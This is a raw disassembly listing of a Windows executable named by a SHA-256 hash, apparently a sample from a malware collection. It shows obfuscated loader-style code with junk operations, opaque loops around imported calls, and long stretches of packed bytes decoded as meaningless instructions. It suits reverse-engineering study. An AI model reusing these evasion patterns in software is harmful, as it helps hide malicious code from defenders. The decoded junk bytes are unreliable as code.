
9cc1bf8b249df37cc472da6d3f225e13667916c19cf49ef580f0d4315ddf3c82.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	xor    ecx,DWORD PTR ds:0x43365b
  40100c:	mov    eax,ds:0x413b16
  401011:	xor    DWORD PTR ds:0x4336f3,edx
  401017:	mov    eax,DWORD PTR [eax+0x198]
  40101d:	mov    ecx,DWORD PTR ds:0x4336a7
  401023:	or     DWORD PTR ds:0x433653,ecx
  401029:	mov    DWORD PTR [ebp-0x8],eax
  40102c:	mov    DWORD PTR ds:0x433643,0x436b
  401036:	jmp    0x40133c
  40103b:	mov    ah,0xd6
  40103d:	ja     0x40109f
  40103f:	jno    0x4010ae
  401041:	mov    bl,0xd2
  401043:	js     0x4010a2
  401045:	repz sbb DWORD PTR [edi+0x7ccee20f],edi
  40104c:	jl     0x4010ca
  40104e:	jl     0x4010b7
  401050:	jle    0x4010ce
  401052:	jl     0x401020
  401054:	xlat   BYTE PTR ds:[ebx]
  401055:	cmp    ecx,edx
  401057:	(bad)
  40105a:	ffree  st(2)
  40105c:	pop    es
  40105d:	push   es
  40105e:	add    ecx,DWORD PTR ds:0x330f02de
  401064:	cmpps  xmm3,XMMWORD PTR [edx],0xc7
  401068:	adc    bl,BYTE PTR [edi]
  40106a:	inc    ebp
  40106b:	pop    edx
  40106c:	add    dh,BYTE PTR [edi-0x4610f327]
  401072:	fcmovnbe st,st(4)
  401074:	add    ecx,DWORD PTR [esp+0x4da0f6bc]
  40107b:	adc    DWORD PTR [ecx+0x641f44dc],ebp
  401081:	out    dx,al
  401082:	outs   dx,DWORD PTR ds:[esi]
  401083:	or     ebx,DWORD PTR ds:0x42d47a9e
  401089:	test   al,0x53
  40108b:	sub    ebp,ebx
  40108d:	(bad)  
  40108e:	ds test eax,0xabc17b88
  401094:	add    al,0xc6
  401096:	ror    DWORD PTR [ebp-0x3a6d2b7b],cl
  40109c:	jmp    0x4010d0
  40109e:	mov    esi,ebp
  4010a0:	dec    edi
  4010a1:	in     al,0xa4
  4010a3:	dec    ebp
  4010a4:	call   DWORD PTR [edi-0x274af866]
  4010aa:	mov    ecx,0x5134e949
  4010af:	and    esi,DWORD PTR [eax-0x41639318]
  4010b5:	jnp    0x4010d4
  4010b7:	ret    
  4010b8:	nop
  4010b9:	sub    eax,0xc05cebd6
  4010be:	out    0xba,al
  4010c0:	bnd call 0x770f4e56
  4010c6:	popa   
  4010c7:	xlat   BYTE PTR ds:[ebx]
  4010c8:	and    cl,cl
  4010ca:	add    ch,ah
  4010cc:	sbb    eax,0x331a45d
  4010d1:	outs   dx,DWORD PTR ds:[esi]
  4010d2:	ins    DWORD PTR es:[edi],dx
  4010d3:	jp     0x4010df
  4010d5:	cmp    eax,0x2a568cd9
  4010da:	jno    0x40115b
  4010dc:	cmp    al,0x8f
  4010de:	or     bl,bl
  4010e0:	mov    ah,0xb
  4010e2:	pop    ebx
  4010e3:	push   ecx
  4010e4:	(bad)  
  4010e6:	adc    eax,0x25e55ed3
  4010eb:	jge    0x401089
  4010ed:	inc    esp
  4010ee:	dec    ebx
  4010ef:	aaa    
  4010f0:	adc    DWORD PTR [ebx],ebp
  4010f2:	ja     0x401129
  4010f4:	sbb    bl,dl
  4010f6:	cmp    al,0x4f
  4010f8:	jmp    0x2d8d:0x4c20a6ce
  4010ff:	dec    eax
  401100:	add    BYTE PTR [eax],ah
  401102:	stc    
  401103:	cmp    edi,DWORD PTR [esi-0x13]
  401106:	jle    0x4010e8
  401108:	test   DWORD PTR [edi+ebp*1-0x3f10113f],ebx
  40110f:	pop    ss
  401110:	sub    bl,dh
  401112:	jp     0x401164
  401114:	jl     0x40110d
  401116:	rcr    BYTE PTR ds:0x412657c8,0x8c
  40111d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40111e:	test   DWORD PTR [ecx],edx
  401120:	jbe    0x40118c
  401122:	add    bh,BYTE PTR [edi+edi*4]
  401125:	mov    es,WORD PTR [edi-0x67f85628]
  40112b:	out    0x5d,eax
  40112d:	test   BYTE PTR [esi+0x5d01b423],bh
  401133:	loopne 0x40118e
  401135:	sub    ch,ah
  401137:	mov    ah,0xfe
  401139:	iret   
  40113a:	in     al,dx
  40113b:	adc    al,dl
  40113d:	sbb    ch,dh
  40113f:	data16 std 
  401141:	mov    WORD PTR [eax-0x1c],?
  401144:	xchg   DWORD PTR ds:0x984102e5,esp
  40114a:	mov    bl,0x8a
  40114c:	mov    edx,0x1d6494d
  401151:	push   es
  401152:	mov    DWORD PTR [edi-0x6f],ecx
  401155:	js     0x401188
  401157:	pop    esi
  401158:	push   esp
  401159:	adc    dl,cl
  40115b:	idiv   DWORD PTR [ecx+esi*2-0x6]
  40115f:	shr    dh,1
  401161:	int3   
  401162:	and    cl,0x97
  401165:	push   cs
  401166:	sub    al,0x70
  401168:	mov    edi,0xeaaedc6a
  40116d:	popf   
  40116e:	nop
  40116f:	ja     0x40110b
  401171:	rol    BYTE PTR [eax+0x1426d2cc],1
  401177:	jne    0x4011be
  401179:	mov    eax,0x2f9ae421
  40117e:	jne    0x4011ce
  401180:	inc    esi
  401181:	jns    0x40117f
  401183:	pop    ecx
  401184:	es call 0x45bf0589
  40118a:	and    dl,ah
  40118c:	in     al,dx
  40118d:	jno    0x4011a0
  40118f:	cmp    eax,0xe17e667c
  401194:	enter  0xb8be,0xc7
  401198:	pop    edi
  401199:	sahf   
  40119a:	test   BYTE PTR [edi-0x20],0xe1
  40119e:	call   0xff79c33b
  4011a3:	(bad)  
  4011a5:	mov    al,dh
  4011a7:	xor    eax,0x5e6d8318
  4011ac:	test   eax,0x7e5ec386
  4011b1:	jge    0x40118d
  4011b3:	adc    BYTE PTR [ebx],al
  4011b5:	pusha  
  4011b6:	std    
  4011b7:	add    BYTE PTR [edx],cl
  4011b9:	push   0xfffffffd
  4011bb:	sub    bh,BYTE PTR ds:0x51a8dada
  4011c1:	inc    edi
  4011c2:	addr16 pop esi
  4011c4:	mov    DWORD PTR [edi+0xf0f3ad3],ecx
  4011ca:	data16 fisubr DWORD PTR [ecx]
  4011cd:	mov    cs,WORD PTR [ecx]
  4011cf:	lds    esp,FWORD PTR [edi]
  4011d1:	aaa    
  4011d2:	idiv   BYTE PTR [edi-0x79edff0e]
  4011d8:	inc    eax
  4011d9:	push   cs
  4011da:	inc    ebp
  4011db:	lahf   
  4011dc:	test   eax,0x1e1cb8d
  4011e1:	ffree  st(5)
  4011e3:	sub    al,0x82
  4011e5:	rcl    DWORD PTR [ebx-0x335a054b],1
  4011eb:	inc    esi
  4011ec:	inc    esi
  4011ed:	add    ah,al
  4011ef:	or     DWORD PTR [ebp+eiz*4-0x4a],edx
  4011f3:	push   esi
  4011f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4011f5:	cmp    BYTE PTR [ecx+eiz*2+0x2a],0xf8
  4011fa:	mov    fs,WORD PTR es:[edx-0x2f7ed05e]
  401201:	add    bl,BYTE PTR [eax+ebx*4+0x2f]
  401205:	add    DWORD PTR [edx],esp
  401207:	inc    esp
  401208:	ins    DWORD PTR es:[edi],dx
  401209:	sahf   
  40120a:	call   0xb934:0xa104265
  401211:	xor    eax,0x8e489cc6
  401216:	(bad)  
  401217:	popf   
  401218:	cwde   
  401219:	es es xchg ebx,eax
  40121c:	xchg   edx,eax
  40121d:	add    ebp,0x998a51c8
  401223:	gs mov esi,0x5a21e449
  401229:	idiv   BYTE PTR [eax+0x13581a93]
  40122f:	mov    edx,cr4
  401232:	ins    BYTE PTR es:[edi],dx
  401233:	into   
  401234:	popa   
  401235:	sub    eax,0xb4f1ef02
  40123a:	and    ebx,0xfffffffc
  40123d:	sbb    eax,0xc848add8
  401242:	sbb    esi,eax
  401244:	jb     0x401201
  401246:	daa    
  401247:	sbb    ch,BYTE PTR [edx-0x66236a05]
  40124d:	shl    DWORD PTR [ebx+0xa61f613],1
  401253:	cs out 0x79,eax
  401256:	push   es
  401257:	test   BYTE PTR [edi-0x7202f745],dl
  40125d:	xchg   esi,eax
  40125e:	test   ebp,edx
  401260:	pop    ebx
  401261:	push   esi
  401262:	or     bh,BYTE PTR [ecx-0x5a264554]
  401268:	or     esi,ecx
  40126a:	ss jnp 0x4012b8
  40126d:	inc    ebx
  40126e:	imul   esp,edi,0xffffff82
  401271:	dec    esi
  401272:	mov    DWORD PTR [ebx+0xefc01a0],0xcf119c4a
  40127c:	(bad)  
  40127d:	sub    edx,DWORD PTR [esi-0xdb4134f]
  401283:	xchg   ecx,eax
  401284:	ret    
  401285:	loop   0x4012fb
  401287:	rol    DWORD PTR [edx-0x63415cf3],1
  40128d:	jg     0x401210
  40128f:	and    al,0xaa
  401291:	(bad)  
  401293:	neg    DWORD PTR [edi+ebx*2-0x23]
  401297:	and    DWORD PTR [eax],0xc6bf64da
  40129d:	call   0x9c13ce98
  4012a2:	cmp    eax,0x2618ce46
  4012a7:	xchg   edi,eax
  4012a8:	mov    bh,0xfd
  4012aa:	push   edi
  4012ab:	gs mov al,0x48
  4012ae:	(bad)  
  4012af:	lea    ebx,[ebp-0x2c]
  4012b2:	rcr    DWORD PTR [ecx-0x57],1
  4012b5:	jg     0x40126c
  4012b7:	hlt    
  4012b8:	retf   0xd867
  4012bb:	sbb    DWORD PTR [edx-0x2b],eax
  4012be:	push   cs
  4012bf:	inc    esp
  4012c0:	js     0x401270
  4012c2:	jmp    0x4012ba
  4012c4:	call   0x2f501b4b
  4012c9:	mov    fs,ecx
  4012cb:	mov    ss,esp
  4012cd:	test   al,0x96
  4012cf:	setp   cl
  4012d2:	mov    dl,0x53
  4012d4:	ret    
  4012d5:	dec    ecx
  4012d6:	push   ebx
  4012d7:	das    
  4012d8:	(bad)  
  4012d9:	pop    ebp
  4012da:	xchg   edx,eax
  4012db:	test   BYTE PTR [ebp+0x1e],0xe1
  4012df:	sbb    BYTE PTR [edi+0x65],0xa
  4012e3:	sbb    edx,DWORD PTR [eax+0x10247ac1]
  4012e9:	(bad)  
  4012ea:	imul   ebp,DWORD PTR [eax-0x2de3c4e7],0x8c6e6fa
  4012f4:	jb     0x40135e
  4012f6:	cmp    ecx,DWORD PTR [eax]
  4012f8:	adc    al,0x96
  4012fa:	hlt    
  4012fb:	add    eax,0x4eb64be
  401300:	mov    edi,0xe1a453bb
  401305:	mov    edx,0xe078ed18
  40130a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40130b:	(bad)  
  40130c:	or     al,0xc
  40130e:	sar    BYTE PTR [ebx+0x3d],0x66
  401312:	test   al,0x3d
  401314:	stos   BYTE PTR es:[edi],al
  401315:	ss aaa 
  401317:	aas    
  401318:	shr    BYTE PTR [edx],0x3c
  40131b:	mov    al,ds:0x6d4c9c1a
  401320:	popf   
  401321:	xor    eax,0xf799c580
  401326:	repnz adc dl,ch
  401329:	jb     0x40134b
  40132b:	aad    0xae
  40132d:	pop    ebp
  40132e:	fcom   DWORD PTR [edi+edx*1-0x3974241a]
  401335:	outs   dx,DWORD PTR ds:[esi]
  401336:	in     al,dx
  401337:	xchg   edx,eax
  401338:	xchg   ebp,eax
  401339:	out    0x52,eax
  40133b:	mov    dl,0x8b
  40133d:	inc    ebp
  40133e:	or     BYTE PTR [ebx+0x953f84d],cl
  401344:	adc    eax,0x4336a7
  401349:	push   esi
  40134a:	add    esi,DWORD PTR ds:0x43369b
  401350:	mov    esi,0x7510853
  401355:	and    ebx,0x1c58
  40135b:	xor    eax,esi
  40135d:	and    DWORD PTR ds:0x43371f,0x0
  401367:	jmp    0x401379
  40136c:	mov    ebx,DWORD PTR ds:0x43371f
  401372:	inc    ebx
  401373:	mov    DWORD PTR ds:0x43371f,ebx
  401379:	cmp    DWORD PTR ds:0x43371f,0x11
  401380:	jae    0x4013b5
  401386:	cmp    DWORD PTR ds:0x43371f,0x16
  40138d:	jne    0x4013b0
  401393:	push   0x12df
  401398:	push   DWORD PTR [ebp-0x18]
  40139b:	push   0x49a7
  4013a0:	push   0x1ff7
  4013a5:	push   0x54a2
  4013aa:	call   DWORD PTR ds:0x41224c
  4013b0:	jmp    0x40136c
  4013b5:	push   edi
  4013b6:	or     edi,edi
  4013b8:	mov    edi,0x32729a
  4013bd:	not    ebx
  4013bf:	add    eax,edi
  4013c1:	adc    ebx,0x3cf3
  4013c7:	mov    DWORD PTR [ecx],eax
  4013c9:	sbb    DWORD PTR ds:0x433663,0x6b1e
  4013d3:	lea    eax,[ebp-0x4]
  4013d6:	mov    DWORD PTR [ebp-0x10],eax
  4013d9:	mov    eax,DWORD PTR [ebp+0x8]
  4013dc:	xor    DWORD PTR ds:0x43369f,0x46ad
  4013e6:	mov    ecx,DWORD PTR [ebp-0x10]
  4013e9:	xor    eax,esi
  4013eb:	add    eax,edi
  4013ed:	mov    DWORD PTR ds:0x433697,0x19
  4013f7:	cmp    DWORD PTR ds:0x433697,0x0
  4013fe:	je     0x40144d
  401404:	cmp    DWORD PTR ds:0x433697,0xb
  40140b:	jne    0x401421
  401411:	push   0x433653
  401416:	push   0x62b0
  40141b:	call   DWORD PTR ds:0x41217c
  401421:	cmp    DWORD PTR ds:0x433697,0xc
  401428:	jne    0x40143b
  40142e:	mov    ebx,DWORD PTR ds:0x433697
  401434:	dec    ebx
  401435:	mov    DWORD PTR ds:0x433697,ebx
  40143b:	mov    ebx,DWORD PTR ds:0x433697
  401441:	dec    ebx
  401442:	mov    DWORD PTR ds:0x433697,ebx
  401448:	jmp    0x4013f7
  40144d:	mov    DWORD PTR [ecx],eax
  40144f:	or     DWORD PTR ds:0x43364f,0x433643
  401459:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  401460:	xor    DWORD PTR ds:0x433653,ebx
  401466:	lea    eax,[ebp-0x14]
  401469:	neg    ecx
  40146b:	mov    DWORD PTR [ebp-0x20],eax
  40146e:	mov    eax,DWORD PTR [ebp-0x14]
  401471:	mov    ecx,DWORD PTR [ebp-0x20]
  401474:	xor    eax,esi
  401476:	neg    ebx
  401478:	add    eax,edi
  40147a:	mov    DWORD PTR [ecx],eax
  40147c:	and    DWORD PTR ds:0x43371b,0x0
  401486:	xor    eax,eax
  401488:	add    eax,DWORD PTR ds:0x43371b
  40148e:	inc    eax
  40148f:	mov    ds:0x43371b,eax
  401494:	cmp    DWORD PTR ds:0x43371b,0x9
  40149b:	jne    0x4014ac
  4014a1:	push   0x8c0a
  4014a6:	call   DWORD PTR ds:0x412250
  4014ac:	cmp    DWORD PTR ds:0x43371b,0x8
  4014b3:	jne    0x4014c4
  4014b9:	mov    eax,ds:0x43371b
  4014be:	inc    eax
  4014bf:	mov    ds:0x43371b,eax
  4014c4:	cmp    DWORD PTR ds:0x43371b,0x1c
  4014cb:	jb     0x401486
  4014d1:	mov    eax,ds:0x413bea
  4014d6:	mov    ebx,0x8e12febe
  4014db:	sbb    DWORD PTR ds:0x4336df,0x47a9
  4014e5:	mov    DWORD PTR [ebp-0xc],ebx
  4014e8:	dec    DWORD PTR ds:0x43365b
  4014ee:	mov    eax,DWORD PTR [eax]
  4014f0:	mov    cx,WORD PTR [ebp-0x4]
  4014f4:	movzx  ecx,cx
  4014f7:	sbb    DWORD PTR ds:0x43364f,0x43369f
  401501:	jmp    0x401807
  401506:	mov    dh,0x9a
  401508:	adc    cl,al
  40150a:	adc    BYTE PTR [ecx+0x7d],dh
  40150d:	jne    0x4014ba
  40150f:	arpl   ax,bx
  401511:	ins    DWORD PTR es:[edi],dx
  401512:	aad    0x37
  401514:	in     al,0x2c
  401516:	addr16 jle 0x401595
  401519:	jl     0x401582
  40151b:	jle    0x401599
  40151d:	jl     0x4014ab
  40151f:	mov    bh,0x81
  401521:	ins    BYTE PTR es:[edi],dx
  401522:	cmp    al,0x4a
  401524:	es or  edx,ebx
  401527:	adc    dl,bl
  401529:	fdiv   DWORD PTR [ecx+0x54]
  40152c:	sti    
  40152d:	inc    ebp
  40152e:	cld    
  40152f:	adc    ch,BYTE PTR [ebx-0x6417abd0]
  401535:	aad    0xc3
  401537:	pusha  
  401538:	in     eax,0xf5
  40153a:	mov    ds:0xf5b7a535,al
  40153f:	ficomp DWORD PTR [ebx-0x6e]
  401542:	scas   eax,DWORD PTR es:[edi]
  401543:	jge    0x40152d
  401545:	and    al,0x75
  401547:	push   0xc3cbc61e
  40154c:	imul   edi,DWORD PTR ds:[eax-0x3e362d96],0x7f
  401554:	fdivr  DWORD PTR [ebp+0x275e2031]
  40155a:	std    
  40155b:	mov    dh,0xcb
  40155d:	imul   edx,DWORD PTR [eax+ebx*8-0x51],0x16
  401562:	mov    eax,cs:0xe83d8e9f
  401568:	cmc    
  401569:	or     al,0x72
  40156b:	jp     0x4014f5
  40156d:	jb     0x4015ad
  40156f:	in     al,dx
  401570:	dec    BYTE PTR [esp+edi*1]
  401573:	sar    DWORD PTR [ebp-0x66f33e35],1
  401579:	(bad)  
  40157a:	test   eax,0x7f171510
  40157f:	popa   
  401580:	dec    esp
  401581:	push   ebp
  401582:	rcl    esi,1
  401584:	xor    ecx,DWORD PTR [ecx-0x5e]
  401587:	pop    es
  401588:	sahf   
  401589:	push   0x4696a028
  40158e:	cli    
  40158f:	bound  esp,QWORD PTR [esi-0x50329188]
  401595:	adc    eax,0xdb19b5c4
  40159a:	pop    esp
  40159b:	retf   
  40159c:	(bad)
  4015a0:	pop    es
  4015a1:	test   DWORD PTR [edi],edx
  4015a3:	cmp    al,0x11
  4015a5:	(bad)  
  4015a6:	(bad)  
  4015a7:	push   DWORD PTR [ebp+0x6b]
  4015aa:	int3   
  4015ab:	loope  0x401538
  4015ad:	sti    
  4015ae:	add    al,0xb9
  4015b0:	(bad)  
  4015b1:	std    
  4015b2:	inc    BYTE PTR [edx]
  4015b4:	mov    bh,0x34
  4015b6:	hlt    
  4015b7:	sub    eax,0x3584b598
  4015bc:	xor    bh,BYTE PTR [edx+0x9d1d9be]
  4015c2:	imul   ebp,DWORD PTR [eax-0x3d7930f7],0x7ca8be7d
  4015cc:	xor    eax,0xd5b26e75
  4015d1:	(bad)  
  4015d2:	idiv   DWORD PTR [eax]
  4015d4:	rol    BYTE PTR [ebp+0x5c63dc6],0xee
  4015db:	pop    ecx
  4015dc:	push   ss
  4015dd:	push   ss
  4015de:	mov    ah,0xb9
  4015e0:	mov    bh,0x33
  4015e2:	xor    bl,BYTE PTR [ebx+edx*1-0x9b6acd5]
  4015e9:	or     DWORD PTR [edi+0x27],ebx
  4015ec:	out    dx,eax
  4015ed:	jmp    0xdb7cc239
  4015f2:	lea    eax,[ebx+0x637c707e]
  4015f8:	jae    0x401625
  4015fa:	push   0xfa635ea7
  4015ff:	std    
  401600:	xchg   BYTE PTR [ecx-0x4f],dh
  401603:	xchg   esi,eax
  401604:	pop    sp
  401606:	bound  eax,QWORD PTR [edx+esi*4-0x4d70bee4]
  40160d:	or     BYTE PTR [eax+0x2d652f4b],cl
  401613:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401614:	jle    0x401636
  401616:	fbld   TBYTE PTR [esi-0x43]
  401619:	adc    al,0x3c
  40161b:	xor    esi,ecx
  40161d:	pop    ds
  40161e:	je     0x401619
  401620:	stos   DWORD PTR es:[edi],eax
  401621:	mov    ds:0xa3480329,al
  401626:	xchg   ebp,eax
  401627:	jge    0x401675
  401629:	jle    0x401684
  40162b:	shl    esp,1
  40162d:	add    DWORD PTR [ecx-0x3a],esi
  401630:	mov    dl,0xa0
  401632:	jo     0x40166a
  401634:	add    dh,bh
  401636:	or     ch,ah
  401638:	dec    edi
  401639:	arpl   WORD PTR [ebp+0x5eb273e7],sp
  40163f:	push   ss
  401640:	mov    ?,WORD PTR [edx-0x6b]
  401643:	mov    dh,0x28
  401645:	stos   BYTE PTR es:[edi],al
  401646:	retf   0x7ba
  401649:	out    0x6b,eax
  40164b:	sbb    eax,0x88ebdaea
  401650:	inc    esp
  401651:	(bad)  
  401653:	jg     0x4015fc
  401655:	mov    ecx,DWORD PTR [edx+0x5a]
  401658:	ja     0x4016be
  40165a:	push   edi
  40165b:	(bad)  
  40165c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40165d:	mul    DWORD PTR [esi+0x1b5ba441]
  401663:	push   ecx
  401664:	or     ah,bh
  401666:	ficomp DWORD PTR [ebx+0x6e]
  401669:	retf   0x3e83
  40166c:	mov    bl,0xa0
  40166e:	push   DWORD PTR [edi-0x55]
  401671:	mov    eax,ds:0x767fdd16
  401676:	mov    bh,0xaa
  401678:	push   eax
  401679:	and    esp,ebx
  40167b:	and    BYTE PTR [eax+0x26d718f2],ch
  401681:	stos   BYTE PTR es:[edi],al
  401682:	sub    BYTE PTR [ebp-0x1a6ddd5b],ah
  401688:	add    ch,BYTE PTR [ebx+0x694eb191]
  40168e:	push   cs
  40168f:	push   esi
  401690:	loop   0x4016fb
  401692:	cmp    bh,BYTE PTR [ecx+0x31]
  401695:	and    DWORD PTR [esi+0x3fd5752b],0xffffffae
  40169c:	pop    ds
  40169d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40169e:	cli    
  40169f:	lods   eax,DWORD PTR ds:[esi]
  4016a0:	adc    al,0xcc
  4016a2:	sub    eax,0x46401c8
  4016a7:	add    eax,DWORD PTR [edx-0x65]
  4016aa:	sub    ecx,DWORD PTR [ecx-0x12]
  4016ad:	push   0xffffffda
  4016af:	or     ebp,DWORD PTR [edi+0x6a]
  4016b2:	xchg   esi,edi
  4016b4:	xchg   esi,ebx
  4016b6:	ficom  DWORD PTR [edx-0x10]
  4016b9:	xchg   ebp,eax
  4016ba:	push   ebx
  4016bb:	mov    BYTE PTR [eax+eax*1+0x3a],al
  4016bf:	lahf   
  4016c0:	add    BYTE PTR [ebx-0x28991e0a],bl
  4016c6:	jge    0x4016a5
  4016c8:	jecxz  0x4016e5
  4016ca:	sub    al,0x3d
  4016cc:	dec    ebp
  4016cd:	scas   eax,DWORD PTR es:[edi]
  4016ce:	into   
  4016cf:	cmp    BYTE PTR [edx-0x32],cl
  4016d2:	mov    esp,0x570a9427
  4016d7:	test   BYTE PTR [edx+0x4a07a41a],cl
  4016dd:	hlt    
  4016de:	jg     0x401718
  4016e0:	ins    DWORD PTR es:[edi],dx
  4016e1:	xchg   edi,eax
  4016e2:	mov    DWORD PTR [esi],eax
  4016e4:	test   BYTE PTR [edi+0xe],bh
  4016e7:	iret   
  4016e8:	mov    ecx,0xc961ff78
  4016ed:	loopne 0x4016f6
  4016ef:	add    dh,dh
  4016f1:	dec    edx
  4016f2:	xor    BYTE PTR [ebx-0x68c21e63],0x75
  4016f9:	and    DWORD PTR [edx+ebp*2],esp
  4016fc:	sbb    eax,0x35359d9
  401701:	bound  edx,QWORD PTR [ecx-0x348a8b4]
  401707:	xor    DWORD PTR [edi+0x2af76d05],0x60303b09
  401711:	sbb    DWORD PTR [edi+0x2ec49f83],edx
  401717:	test   DWORD PTR [ebx],esp
  401719:	push   ax
  40171b:	add    BYTE PTR [ebp+0x69822d5c],ah
  401721:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401722:	cs mov ebx,0x1c7dcf1f
  401728:	stos   DWORD PTR es:[edi],eax
  401729:	xor    bh,BYTE PTR [ecx+0x622962e6]
  40172f:	imul   edi,DWORD PTR [edx-0x22f91f43],0xa0a7fbc2
  401739:	mov    DWORD PTR [ebx+0x5],edi
  40173c:	dec    edi
  40173e:	or     cl,bh
  401740:	push   ss
  401741:	mov    bl,0x95
  401743:	push   cs
  401744:	inc    ebp
  401745:	call   0x6b42:0xaf66e089
  40174c:	rol    cl,0x4d
  40174f:	xor    al,0xc4
  401751:	cmp    eax,0xed1a7664
  401756:	jns    0x4016f6
  401758:	cdq    
  401759:	adc    BYTE PTR [eax+0x3d],dh
  40175c:	dec    eax
  40175d:	lods   al,BYTE PTR ds:[esi]
  40175e:	in     eax,dx
  40175f:	inc    eax
  401760:	pcmpgtd mm0,QWORD PTR [ebp-0x7]
  401764:	daa    
  401765:	stos   BYTE PTR es:[edi],al
  401766:	into   
  401767:	xlat   BYTE PTR ds:[ebx]
  401768:	stos   DWORD PTR es:[edi],eax
  401769:	bound  ebx,QWORD PTR [edi-0x4c]
  40176c:	jp     0x401713
  40176e:	or     eax,edx
  401770:	and    esp,edi
  401772:	imul   ecx,DWORD PTR [edi-0x18d8a7c1],0x10
  401779:	sbb    esi,edx
  40177b:	mov    ebp,0xa2ab981c
  401780:	or     BYTE PTR [esi],bh
  401782:	in     al,dx
  401783:	cmp    dh,al
  401785:	adc    al,0xd1
  401787:	and    eax,0xe511e5a1
  40178c:	daa    
  40178d:	push   ebx
  40178e:	int3   
  40178f:	cmp    BYTE PTR [eax],dh
  401791:	ds cmp eax,0x1ba475e4
  401797:	or     cl,BYTE PTR [esi]
  401799:	clc    
  40179a:	xlat   BYTE PTR ds:[ebx]
  40179b:	or     BYTE PTR [eax+0x7e49b771],dh
  4017a1:	mov    ss,WORD PTR [esi-0xd]
  4017a4:	xchg   ebx,eax
  4017a5:	scas   al,BYTE PTR es:[edi]
  4017a6:	jl     0x4017bf
  4017a8:	enter  0x5cc1,0x6
  4017ac:	xchg   DWORD PTR [ebp+0x3d351e14],eax
  4017b2:	sti    
  4017b3:	dec    eax
  4017b4:	push   eax
  4017b5:	mov    BYTE PTR [ebp-0x5b],al
  4017b8:	inc    edi
  4017b9:	mov    bh,0xd0
  4017bb:	inc    esi
  4017bc:	mov    ebx,0x2ad900b
  4017c1:	mov    ecx,0x480f4043
  4017c6:	test   eax,0xc13848f1
  4017cb:	xchg   esp,eax
  4017cc:	mov    ds:0x315b926a,eax
  4017d1:	out    dx,eax
  4017d2:	mov    ch,0xd3
  4017d4:	mov    ebp,0xc8da3cb0
  4017d9:	ins    BYTE PTR es:[edi],dx
  4017da:	imul   DWORD PTR [ebx]
  4017dc:	mov    eax,ds:0x5909d4c1
  4017e1:	shl    BYTE PTR [ecx],1
  4017e3:	inc    esp
  4017e4:	loopne 0x40181d
  4017e6:	xchg   esi,eax
  4017e7:	gs loope 0x4017f9
  4017ea:	pop    ebx
  4017eb:	mov    al,BYTE PTR [eax+0x784585e7]
  4017f1:	xor    eax,0x5ea26821
  4017f6:	mov    ds:0x11130333,eax
  4017fb:	mov    dh,0x4d
  4017fd:	loop   0x401797
  4017ff:	es push edi
  401801:	mov    eax,0x961f5c3e
  401806:	and    BYTE PTR [ebx],al
  401808:	or     BYTE PTR [ecx+0x433757],ah
  40180e:	add    DWORD PTR ds:0x43364b,eax
  401814:	mov    DWORD PTR [ebp-0x18],ecx
  401817:	mov    eax,DWORD PTR [ebp+0x8]
  40181a:	xor    DWORD PTR ds:0x43369b,0x1391
  401824:	mov    ecx,DWORD PTR [ebp-0x8]
  401827:	xor    eax,esi
  401829:	add    eax,edi
  40182b:	cmp    DWORD PTR [ecx],eax
  40182d:	mov    DWORD PTR ds:0x43369b,0x716
  401837:	jne    0x402597
  40183d:	mov    eax,DWORD PTR [ebp+0x8]
  401840:	add    DWORD PTR ds:0x433663,edi
  401846:	mov    ecx,DWORD PTR [ebp-0x18]
  401849:	or     DWORD PTR ds:0x43372f,0x433717
  401853:	xor    eax,esi
  401855:	add    eax,edi
  401857:	cmp    DWORD PTR [ecx],eax
  401859:	jne    0x401f33
  40185f:	sbb    ecx,DWORD PTR ds:0x4336ab
  401865:	mov    eax,DWORD PTR [ebp+0x8]
  401868:	mov    DWORD PTR ds:0x4336e7,0x18
  401872:	cmp    DWORD PTR ds:0x4336e7,0x0
  401879:	je     0x4018bc
  40187f:	cmp    DWORD PTR ds:0x4336e7,0x28
  401886:	jne    0x4018a2
  40188c:	push   DWORD PTR [ebp-0x24]
  40188f:	push   DWORD PTR [ebp-0xc]
  401892:	push   0x6fcb
  401897:	push   0x70d4
  40189c:	call   DWORD PTR ds:0x4120b4
  4018a2:	xor    edx,edx
  4018a4:	add    edx,DWORD PTR ds:0x4336e7
  4018aa:	dec    edx
  4018ab:	mov    DWORD PTR ds:0x4336e7,edx
  4018b1:	jmp    0x401872
  4018b6:	adc    edx,0x63fa
  4018bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4018bf:	and    DWORD PTR ds:0x433717,0x0
  4018c9:	jmp    0x4018db
  4018ce:	mov    edx,DWORD PTR ds:0x433717
  4018d4:	inc    edx
  4018d5:	mov    DWORD PTR ds:0x433717,edx
  4018db:	cmp    DWORD PTR ds:0x433717,0x15
  4018e2:	jae    0x401910
  4018e8:	cmp    DWORD PTR ds:0x433717,0x17
  4018ef:	jne    0x40190b
  4018f5:	push   0x43376f
  4018fa:	push   DWORD PTR [ebp-0x10]
  4018fd:	push   0x6a0b
  401902:	push   DWORD PTR [ebp-0xc]
  401905:	call   DWORD PTR ds:0x4120b8
  40190b:	jmp    0x4018ce
  401910:	xor    eax,esi
  401912:	add    eax,edi
  401914:	mov    DWORD PTR [ecx],eax
  401916:	mov    eax,DWORD PTR [ebp-0x10]
  401919:	mov    ecx,DWORD PTR [ebp+0x10]
  40191c:	jmp    0x401c22
  401921:	xor    eax,0x752ed85c
  401926:	stos   BYTE PTR es:[edi],al
  401927:	cmc    
  401928:	pop    ebx
  401929:	push   eax
  40192a:	mov    bh,0xe1
  40192c:	retf   
  40192d:	aaa    
  40192e:	sbb    al,0x8a
  401930:	dec    esp
  401931:	dec    esi
  401932:	jnp    0x4019b0
  401934:	jl     0x40199d
  401936:	jle    0x4019b4
  401938:	jl     0x40199c
  40193a:	sub    BYTE PTR [ebx+0x3d],bh
  40193d:	les    ecx,FWORD PTR [eax+0x5a]
  401940:	sahf   
  401941:	fwait
  401942:	sub    ebp,DWORD PTR [ebx-0x18090986]
  401948:	mov    eax,ds:0xbf58c138
